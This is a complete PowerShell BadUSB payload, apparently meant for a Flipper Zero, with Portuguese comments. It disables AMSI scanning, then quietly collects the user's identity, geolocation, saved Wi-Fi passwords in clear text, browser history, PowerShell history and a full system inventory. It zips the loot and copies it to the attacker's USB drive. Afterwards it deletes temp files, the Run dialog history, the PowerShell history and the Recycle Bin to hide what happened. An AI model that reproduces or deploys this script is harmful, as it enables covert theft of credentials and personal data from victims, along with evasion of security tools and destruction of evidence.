<#
.SYNOPSIS
    ADV-Recon Stealth v9 — Invisivel total + AMSI bypass
    Recon 100% oculto. Aguarda 30s pelo Flipper Zero.
    Exfiltracao para SD via USB Mass Storage.
#>

############################################################################################################################################################
# AMSI BYPASS (primeira linha executavel — antes de qualquer coisa)
############################################################################################################################################################
try {
    $a=[Ref].Assembly.GetTypes()
    foreach($t in $a){
        if($t.Name -like '*AmsiUtils'){
            $t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            break
        }
    }
}catch{}

############################################################################################################################################################
# LOG INTERNO
############################################################################################################################################################
$Global:Log = @()
function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}

L 'ADV-Recon Stealth v9 iniciado'
L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)

############################################################################################################################################################
# CONFIG
############################################################################################################################################################
$Timeout   = 30
$OutFolder = 'loot'
$Marker    = 'badusb'
$IgnoreIDs = @('C:', 'D:')
$IgnoreVOL = @('Google Drive', 'EVO')

$Fn  = $env:USERNAME + '-LOOT-' + (Get-Date -f 'yyyy-MM-dd_HH-mm')
$Zip = $Fn + '.zip'
$WD  = $env:TEMP + '\' + $Fn
$ZP  = $env:TEMP + '\' + $Zip

mkdir $WD -Force | Out-Null

############################################################################################################################################################
# RECON
############################################################################################################################################################
L 'ETAPA 1: Tree'
try {
    cmd /c 'tree %USERPROFILE% /a /f' 2>$null | Out-File ($WD + '\tree.txt') -Encoding UTF8
    $tsz = (gi ($WD + '\tree.txt')).Length
    if ($tsz -lt 50) {
        cmd /c 'dir %USERPROFILE% /s /b' 2>$null | Out-File ($WD + '\tree.txt') -Encoding UTF8
    }
    L ('OK: Tree (' + $tsz + ' bytes)')
} catch { L 'FAIL: Tree' }

L 'ETAPA 2: PS History'
try {
    $src = $env:APPDATA + '\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
    cp $src ($WD + '\pshist.txt') -ea 0
    L 'OK: PS History'
} catch { L 'FAIL: PS History' }

L 'ETAPA 3: User data'
try { $ufn = (Get-LocalUser $env:USERNAME).FullName } catch { $ufn = $env:USERNAME }
try { $uem = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName } catch { $uem = 'N/D' }
try {
    Add-Type -AssemblyName System.Device
    $geo = New-Object System.Device.Location.GeoCoordinateWatcher
    $geo.Start()
    while ($geo.Status -ne 'Ready' -and $geo.Permission -ne 'Denied') { Sleep -m 50 }
    if ($geo.Permission -eq 'Denied') { $la = 'N/D'; $lo = 'N/D'; $gs = 'Denied' }
    else { $la = $geo.Position.Location.Latitude; $lo = $geo.Position.Location.Longitude; $gs = 'OK' }
    L 'OK: Geo'
} catch { $la = 'N/D'; $lo = 'N/D'; $gs = 'Err'; L 'FAIL: Geo' }

L 'ETAPA 4: Local users'
try { $lu = Get-WmiObject Win32_UserAccount | ft Caption, Domain, Name, FullName, SID | Out-String; L 'OK: Users' } catch { $lu = 'Err'; L 'FAIL: Users' }

L 'ETAPA 5: UAC/LSASS/RDP'
try {
    $rk = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    $c  = (gp $rk).ConsentPromptBehaviorAdmin
    $p  = (gp $rk).PromptOnSecureDesktop
    if ($c -eq 0 -and $p -eq 0) { $ua = 'Never' }
    elseif ($c -eq 5 -and $p -eq 0) { $ua = 'Notify(no dim)' }
    elseif ($c -eq 5 -and $p -eq 1) { $ua = 'Notify(default)' }
    elseif ($c -eq 2 -and $p -eq 1) { $ua = 'Always' }
    else { $ua = 'Unknown' }
} catch { $ua = 'Err' }
try { $ls = Get-Process lsass -ea Stop; if ($ls.ProtectedProcess) { $lst = 'PPL' } else { $lst = 'No PPL' } } catch { $lst = 'N/F' }
try {
    $tsk = 'hklm:\System\CurrentControlSet\Control\Terminal Server'
    if ((gp $tsk).fDenyTSConnections -eq 0) { $rd = 'On' } else { $rd = 'Off' }
} catch { $rd = 'Err' }
L 'OK: UAC/LSASS/RDP'

L 'ETAPA 6: Network'
try { $pu = (iwr ipinfo.io/ip -UseBasicParsing -TimeoutSec 3).Content.Trim() } catch { $pu = 'Err' }
try {
    $lip = Get-NetIPAddress -IfAlias '*Ethernet*', '*Wi-Fi*' -AddrFam IPv4 -ea 0
    $lip = $lip | Select IfAlias, IPAddress, PrefixOrigin | Out-String
} catch { $lip = 'Err' }
try {
    $mc = Get-NetAdapter -Name '*Ethernet*', '*Wi-Fi*' -ea 0
    $mc = $mc | Select Name, MacAddress, Status | Out-String
} catch { $mc = 'Err' }
L 'OK: Network'

L 'ETAPA 7: WiFi'
try {
    $nwRaw = netsh wlan show networks mode=Bssid 2>$null
    $nwLines = $nwRaw | Where-Object { $_ -like 'SSID*' -or $_ -like '*Authentication*' -or $_ -like '*Encryption*' }
    $nw = $nwLines -join "`n"
    if (!$nw) { $nw = 'None' }
    L 'OK: Nearby WiFi'
} catch { $nw = 'Err'; L 'FAIL: Nearby WiFi' }
try {
    $profRaw = netsh wlan show profiles 2>$null
    $profNames = @()
    foreach ($line in $profRaw) {
        if ($line -match ': (.+)$') {
            $profNames += $Matches[1].Trim()
        }
    }
    $wpOut = @()
    foreach ($pn in $profNames) {
        $detRaw = netsh wlan show profile name="$pn" key=clear 2>$null
        $pwLine = $detRaw | Select-String 'Key Content' | Select-Object -First 1
        if ($pwLine) {
            if ($pwLine -match ': (.+)$') {
                $wpOut += [PSCustomObject]@{ PROFILE_NAME = $pn; PASSWORD = $Matches[1].Trim() }
            }
        } else {
            $wpOut += [PSCustomObject]@{ PROFILE_NAME = $pn; PASSWORD = '(open)' }
        }
    }
    if ($wpOut.Count -gt 0) {
        $wp = ($wpOut | Format-Table -AutoSize | Out-String)
    } else {
        $wp = 'None'
    }
    L ('OK: WiFi Profiles (' + $wpOut.Count + ')')
} catch { $wp = 'Err'; L 'FAIL: WiFi Profiles' }

L 'ETAPA 8: System'
try { $cs = Get-CimInstance CIM_ComputerSystem; $cn = $cs.Name; $cm = $cs.Model; $cf = $cs.Manufacturer } catch { $cn = $env:COMPUTERNAME; $cm = '?'; $cf = '?' }
try { $bios = Get-CimInstance CIM_BIOSElement | Out-String } catch { $bios = 'Err' }
try { $os = (gwmi win32_operatingsystem) | Select Caption, Version | Out-String } catch { $os = 'Err' }
try { $cpu = gwmi Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | fl | Out-String } catch { $cpu = 'Err' }
try { $mb = gwmi Win32_BaseBoard | fl | Out-String } catch { $mb = 'Err' }
try { $rc = gwmi Win32_PhysicalMemory | measure Capacity -sum | %{ '{0:N1} GB' -f ($_.sum / 1GB) } } catch { $rc = 'Err' }
try { $rm = gwmi Win32_PhysicalMemory | select DeviceLocator, @{N='Capacity';E={'{0:N1} GB'-f($_.Capacity/1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | ft | Out-String } catch { $rm = 'Err' }
try { $vc = gwmi Win32_VideoController | ft Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -w 250 } catch { $vc = 'Err' }
L 'OK: System'

L 'ETAPA 9: Disks/Devices'
try {
    $dt = @{ 2 = 'Rem'; 3 = 'Fix'; 4 = 'Net'; 5 = 'CD' }
    $hd = gwmi Win32_LogicalDisk | select DeviceID, VolumeName, @{N='Tipo';E={$dt[[int]$_.DriveType]}}, FileSystem, VolumeSerialNumber, @{N='Sz';E={'{0:N1}G' -f ($_.Size/1Gb)}}, @{N='Fr';E={'{0:N1}G' -f ($_.FreeSpace/1Gb)}}, @{N='FrP';E={'{0:N1}' -f ((100/($_.Size/$_.FreeSpace)))}} | ft DeviceID, VolumeName, Tipo, FileSystem, VolumeSerialNumber, @{N='Size';E={$_.Sz};align='right'}, @{N='Free';E={$_.Fr};align='right'}, @{N='Free%';E={($_.FrP+' %%')};align='right'} | Out-String
} catch { $hd = 'Err' }
try { $cmdev = gwmi Win32_USBControllerDevice -ea 0 | %{ [Wmi]($_.Dependent) } | Select Name, DeviceID, Manufacturer | sort Name -Desc | ft | Out-String -w 250 } catch { $cmdev = 'Err' }
try { $na = gwmi Win32_NetworkAdapterConfiguration | ?{ $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | ft | Out-String -w 250 } catch { $na = 'Err' }
L 'OK: Disks/Devices'

L 'ETAPA 10: Procs/Conns/Svcs'
try { $pr = gwmi win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | sort ProcessName | ft Handle, ProcessName, ExecutablePath, CommandLine | Out-String -w 250 } catch { $pr = 'Err' }
try {
    $tc = Get-NetTCPConnection -ea 0 | select @{N='Local';E={$_.LocalAddress+':'+$_.LocalPort}}, @{N='Remote';E={$_.RemoteAddress+':'+$_.RemotePort}}, State, AppliedSetting, OwningProcess
    $tc = $tc | %{
        $li = $_
        $pi = ($pr | ?{ [int]$_.Handle -like [int]$li.OwningProcess })
        New-Object PSObject -p @{ Local = $li.Local; Remote = $li.Remote; State = $li.State; Applied = $li.AppliedSetting; PID = $li.OwningProcess; Proc = $pi.ProcessName }
    } | select Local, Remote, State, Applied, PID, Proc | sort Local | ft | Out-String -w 250
} catch { $tc = 'Err' }
try { $sv = gwmi win32_service | select State, Name, DisplayName, PathName, @{N='Srt';E={$_.State+$_.Name}} | sort Srt | ft State, Name, DisplayName, PathName | Out-String -w 250 } catch { $sv = 'Err' }
L 'OK: Procs/Conns/Svcs'

L 'ETAPA 11: Software/Drivers'
try { $sw = gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{ $_.DisplayName -notlike $null } | Select DisplayName, DisplayVersion, Publisher, InstallDate | sort DisplayName | ft -Auto | Out-String -w 250 } catch { $sw = 'Err' }
try { $dr = gwmi Win32_PnPSignedDriver | ?{ $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -w 250 } catch { $dr = 'Err' }
L 'OK: Software/Drivers'

L 'ETAPA 12: Misc'
try {
    $startDir = [Environment]::GetFolderPath('Startup')
    $su = (ls $startDir -ea 0).Name -join ', '
    if (!$su) { $su = '(vazio)' }
} catch { $su = 'Err' }
try { $st = (Get-ScheduledTask -ea 0 | Select TaskName, State | ft -Auto | Out-String) } catch { $st = 'Err' }
try { $kl = klist sessions 2>$null; if (!$kl) { $kl = 'Nenhuma' } } catch { $kl = 'Err' }
try { $rf = ls $env:USERPROFILE -Recurse -File -ea 0 | sort LastWriteTime -Desc | select -First 50 FullName, LastWriteTime | Out-String } catch { $rf = 'Err' }
L 'OK: Misc'

L 'ETAPA 13: Browser data'
$bl = $WD + '\BrowserData.txt'
$rx = '(http|https)://[\w\-\.]+(:\d+)?(/[\w\-\./\?%&=#]*)?'

function B($browser, $dtype, $path) {
    if (!(Test-Path $path -ea 0)) { return }
    try {
        $tmp = $WD + '\_btmp.tmp'
        $q1 = '"' + $path + '"'
        cmd /c "findstr /R /C:http:// /C:https:// $q1" 2>$null | Select-Object -First 500 | Out-File $tmp -Encoding ASCII
        $urls = gc $tmp -ea 0 | Select-String -AllMatches $rx | ForEach-Object { $_.Matches.Value } | Sort-Object -Unique
        foreach ($u in $urls) {
            "[$browser|$dtype] $u" | Out-File $bl -Append -Encoding UTF8
        }
        ri $tmp -Force -ea 0
    } catch {}
}

B chrome history   "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
B chrome bookmarks "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
B edge history   "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
B edge bookmarks "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
$ffprof = ls "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" -ea 0 | Select-Object -First 1
if ($ffprof) { B firefox history $ffprof.FullName }
B opera history   "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Default\History"
B opera bookmarks "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Default\Bookmarks"
B brave history   "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
B brave bookmarks "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
L 'OK: Browser data done'

############################################################################################################################################################
# COMPILAR & COMPRIMIR
############################################################################################################################################################
L 'Compilando relatorio'
$out = @"
ADV-Recon Stealth v9
===================

Full Name: $ufn
Email: $uem
Geo: Lat=$la Lon=$lo ($gs)
----------------------------------------------------------------
Local Users:
$lu
----------------------------------------------------------------
UAC: $ua | LSASS: $lst | RDP: $rd
Public IP: $pu
Local IPs:
$lip
MAC:
$mc
----------------------------------------------------------------
Computer: $cn | Model: $cm | Mfr: $cf
BIOS:
$bios
OS:
$os
CPU:
$cpu
MB:
$mb
RAM: $rc
$rm
GPU:
$vc
----------------------------------------------------------------
Startup: $su
Scheduled Tasks:
$st
Sessions:
$kl
Recent Files:
$rf
----------------------------------------------------------------
Disks:
$hd
COM/USB:
$cmdev
Network:
$na
----------------------------------------------------------------
WiFi Nearby:
$nw
WiFi Profiles:
$wp
----------------------------------------------------------------
Processes:
$pr
----------------------------------------------------------------
Connections:
$tc
----------------------------------------------------------------
Services:
$sv
----------------------------------------------------------------
Software:
$sw
----------------------------------------------------------------
Drivers:
$dr
----------------------------------------------------------------
"@
$out > ($WD + '\computerData.txt')

try { Compress-Archive $WD $ZP -Force; L ('ZIP: ' + $ZP) } catch { L 'ZIP FAIL' }

############################################################################################################################################################
# ESPERAR FLIPPER (30s — completamente oculto)
############################################################################################################################################################

$found  = $null
$ok     = $false
$t      = 0

while ($t -lt $Timeout -and !$found) {
    try {
        $vs = gwmi Win32_LogicalDisk -ea Stop
        $vs = $vs | Where-Object {
            ($_.DriveType -eq 2 -or $_.DriveType -eq 3) `
            -and ($_.DeviceID -notin $IgnoreIDs) `
            -and ($_.VolumeName -notin $IgnoreVOL)
        }
    } catch { $vs = @() }

    foreach ($v in $vs) {
        try {
            $rt = $v.DeviceID + '\'
            if (!(Test-Path $rt -ea Stop)) { continue }
            $mp = $v.DeviceID + '\' + $Marker
            if (Test-Path $mp -ea Stop) {
                $found = $v.DeviceID
                break
            }
        } catch {}
    }

    if (!$found) { Sleep 1; $t++ }
}

############################################################################################################################################################
# EXFILTRACAO
############################################################################################################################################################

if ($found) {
    $destFolder = $found + '\' + $OutFolder + '\' + $env:COMPUTERNAME + '-' + (Get-Date -f 'yyyy-MM-dd_HH-mm')
    try {
        mkdir $destFolder -Force | Out-Null
        $destFile = $destFolder + '\' + $Zip
        cp $ZP $destFile -Force
        $sh = (Get-FileHash $ZP -Algorithm MD5).Hash
        $dh = (Get-FileHash $destFile -Algorithm MD5).Hash
        if ($sh -eq $dh) {
            $Global:Log | Out-File ($found + '\debug.log') -Force
            $ok = $true
            L 'EXFIL: SUCESSO'
        } else {
            L 'EXFIL: Hash mismatch'
        }
    } catch {
        L ('EXFIL: Erro — ' + $_.Exception.Message)
    }
} else {
    L 'EXFIL: Drive Flipper nao encontrado'
}

L ('Resultado final: ' + $(if($ok){'OK'}else{'NOK'}))

############################################################################################################################################################
# CLEANUP TOTAL
############################################################################################################################################################

L 'Cleanup iniciado'
try { ri $WD -Recurse -Force -ea 0 } catch {}
try { ri $ZP -Force -ea 0 } catch {}
try { ri ($env:TEMP + '\a.ps1') -Force -ea 0 } catch {}
try { ri ($env:TEMP + '\a_cnt.ps1') -Force -ea 0 } catch {}
try { ri ($env:TEMP + '\a_res.txt') -Force -ea 0 } catch {}
try { ri ($env:TEMP + '\*') -Recurse -Force -ea 0 } catch {}
try { reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null } catch {}
try { ri (Get-PSreadlineOption).HistorySavePath -ea 0 } catch {}
try { Clear-RecycleBin -Force -ea 0 } catch {}
L 'Cleanup concluido'

exit
